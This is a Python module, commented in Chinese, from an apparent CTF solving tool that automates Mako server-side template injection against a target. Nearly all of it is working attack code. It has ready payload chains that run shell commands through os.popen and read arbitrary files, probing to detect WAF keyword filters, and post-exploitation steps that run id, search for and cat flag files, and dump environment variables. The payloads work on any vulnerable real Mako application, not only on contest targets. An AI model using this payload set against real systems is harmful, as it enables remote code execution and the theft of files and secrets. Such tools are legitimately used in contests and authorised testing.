"""
CTF 解题工具 — Mako 引擎模块
用途: 面向 CTF 竞赛的 Mako (Python) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - 原生支持 <% %> Python 代码块，无沙箱限制
  - ${__import__('os').popen('id').read()} 直接执行
  - 语法用 ${7*7}→49（与 FreeMarker 相同，需用 Python 环境报错区分）
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（原生代码执行）',
        'filters': set(),
        'rce': '${__import__("os").popen("CMD").read()}',
        'file_read': '${__import__("builtins").open("FILEPATH").read()}',
    },
]


class MakoEngine(BaseEngine):
    """Mako (Python) SSTI 引擎"""

    name = 'mako'
    template_tags = ('${', '}', '<%', '%>')
    error_keywords = [
        'ZeroDivisionError', 'NameError', 'TypeError',
        'AttributeError', 'SyntaxError', 'Internal Server Error',
        'Traceback', 'mako.exceptions',
    ]

    detect_payloads = [
        {'payload': '${7*7}', 'expected': '49', 'engines': ['mako']},
    ]

    fingerprints = [
        {"payload": "${7*7}", "expected": "49", "desc": "Mako 基本运算"},
        {"payload": "${self.module.cache.args}", "expected": "", "desc": "Mako 模块信息"},
    ]

    rce_chains = [
        '${__import__("os").popen("CMD").read()}',
        '${self.module.cache.args.__builtins__["__import__"]("os").popen("CMD").read()}',
        # 原生代码块方式
        '<%import os; x=os.popen("CMD").read()%>${x}',
    ]

    file_read_chains = [
        '${__import__("builtins").open("FILEPATH").read()}',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """Mako WAF 探测"""
        filters = set()
        filtered_keywords = set()

        t = toolkit.send_and_clean('${7*7}')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('${7 * 7}')
        if '49' not in t:
            filters.add('space')

        # 关键字探测
        for kw in ['__import__', 'os', 'popen', 'open', 'builtins']:
            if kw == '__import__':
                payload = '${__import__("os")}'
            elif kw == 'os':
                payload = '${__import__("os")}'
            elif kw == 'popen':
                payload = '${__import__("os").popen}'
            elif kw == 'open':
                payload = '${open}'
            elif kw == 'builtins':
                payload = '${__import__("builtins")}'
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)

        if filtered_keywords:
            filters.add('keyword')

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Mako RCE payload 构造"""
        # Mako 无沙箱，直接用 Python 代码
        for chain in self.rce_chains:
            if 'CMD' in chain:
                return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Mako 文件读取 payload"""
        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '${' in text or '<%' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Mako 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Mako)")
        print("=" * 60)

        # Mako 模块信息
        text = toolkit.send_and_clean('${self.module.cache.args}')
        if text and not is_waf_blocked(text):
            print(f"  Mako 模块信息 (前300字符): {text[:300]}")

        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")

            print("\n  [3] 环境变量:")
            output = toolkit.exec_cmd('env')
            if output:
                print(f"      {output[:500]}")
